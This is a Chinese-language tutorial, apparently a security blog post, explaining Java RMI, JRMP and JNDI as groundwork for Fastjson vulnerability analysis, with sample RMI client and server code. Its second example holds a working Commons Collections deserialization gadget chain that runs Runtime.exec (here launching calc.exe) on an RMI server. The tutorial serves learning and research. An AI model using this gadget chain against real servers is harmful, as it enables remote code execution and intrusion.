## ****前言****

在分析Fastjson漏洞前，需要了解RMI机制和JNDI注入等知识点，所以本篇文来分析一下RMI机制。

在Java里面简单来说使用Java调用远程Java程序使用的就是RMI，调用C的程序调用的是JNI，调用python程序使用到的是Jython。RMI、JNI、Jython，其实在安全中都能发挥比较大的作用。
JNI在安全里面的运用就比较大了，既然可以调用C语言，那么后面的… …自行脑补。这个暂且忽略不讲，后面再说。

如果使用或了解过Python编写burp的插件的话，对这个Jython也不会陌生，如果说Python的插件就需要安装一个Jython的jar包。这个后面再说。这里主要讲RMI，该机制会在反序列化中频繁运用，例如Weblogic的T3协议的反序列化漏洞。

##  ** **概念****

Rmi：远程方法调用， JRMP：Java远程消息交换协议。这是运行在Java RMI之下、TCP/IP之上的线路层协议。
该协议要求服务端与客户端都为Java编写，就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。

JNDI :Java命名和目录接口（the Java naming and directory
interface，JNDI）是一组在Java应用中访问命名和目录服务的API。命名服务将名称和对象联系起来，使得读者可以用名称访问对象。
目录服务是一种命名服务，在这种服务里，对象不但有名称，还有属性。

##  ** **Rmi作用****

Rmi为远程方法调用，是允许在一个java虚拟机的对象调用另一个java虚拟器的方法，这俩个虚拟机可以在一台计算机的不同进程中，也可在不同网络的计算机中

##  ** **Rmi三个关键部分****

Registry: 注册表，存放着远程对象的位置(ip,端口) client: 调用远程的对象 Server: 提供远程的对象

##  ** **Rmi基础运用****

前面说过RMI可以调用远程的一个java对象

    
    
    package RmiStudyOne;
    import RmiStudyOne.HelloInterface;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
    //获取远程主机对象
    Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
    //利用注册表的代理去获取远程注册表中名为hello的对象
    HelloInterface helloInterface = (HelloInterface) registry.lookup("test");
    //调用远程方法
    System.out.println(helloInterface.say("1234"));
    }
    }

server代码

    
    
    package RmiStudyOne;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    //注册远程对象
    public class Server {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
    //创建远程对象
    HelloInterface helloservice = new HelloImpl();
    //创建注册表
    Registry registry = LocateRegistry.createRegistry(1099);
    //绑定ip,默认是127.0.0.1
    System.setProperty("java.rmi.server.hostname","127.0.0.1");
    //绑定远程对象到注册表李，并且命名为Hello
    registry.bind("test",helloservice);
    }
    }

### helloimpl

    
    
    package RmiStudyOne;
    import RmiStudyOne.HelloInterface;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class HelloImpl extends UnicastRemoteObject  implements HelloInterface {
    public HelloImpl() throws RemoteException {
    super();
    System.out.println("构造方法");
    }
    public String say(String name) throws RemoteException {
    return "test"+name;
    }
    }

### hellointerface

    
    
    package RmiStudyOne;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    //创建接口，必须继承Remote
    public interface HelloInterface extends Remote {
    //每个函数必须抛出RemoteException异常
    String say(String name) throws RemoteException;
    }

### RMi触发反序列示例

### Client

    
    
    package RmiStudyTwo;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.rmi.Naming;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class client {
    public static void main(String[] args) throws Exception {
    Registry registry =  LocateRegistry.getRegistry("127.0.0.1",1099);
    User user = (User)registry.lookup("user");
    user.work(getpayload());
    //另一种写法
    //        String url = "rmi://192.168.20.130:1099/user";
    //        User userClient = (User) Naming.lookup(url);
    //        userClient.work(getpayload());
    }
    public static Object getpayload() throws Exception{
    Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map map = new HashMap();
    map.put("value", "sijidou");
    Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
    Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Retention.class, transformedMap);
    return instance;
    }
    }

### server

    
    
    package RmiStudyTwo;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Server {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
    User user = new UserImpl();
    Registry registry = LocateRegistry.createRegistry(1099);
    registry.bind("user",user);
    System.out.println("Rmi://127.0.0.1:1099");
    }
    }

### user

    
    
    package RmiStudyTwo;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    //远程接口类
    public interface User extends Remote {
    public String hello(String hello)throws RemoteException;
    void work(Object object) throws  RemoteException;
    void say() throws RemoteException;
    }
    userimpl
    package RmiStudyTwo;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class UserImpl extends UnicastRemoteObject  implements User{
    protected UserImpl() throws RemoteException {
    super();
    }
    public String hello(String hello) throws RemoteException {
    return "hello function";
    }
    public void work(Object object) throws RemoteException {
    System.out.println("work方法被调用");
    }
    public void say() throws RemoteException {
    System.out.println("say方法调用");
    }
    }

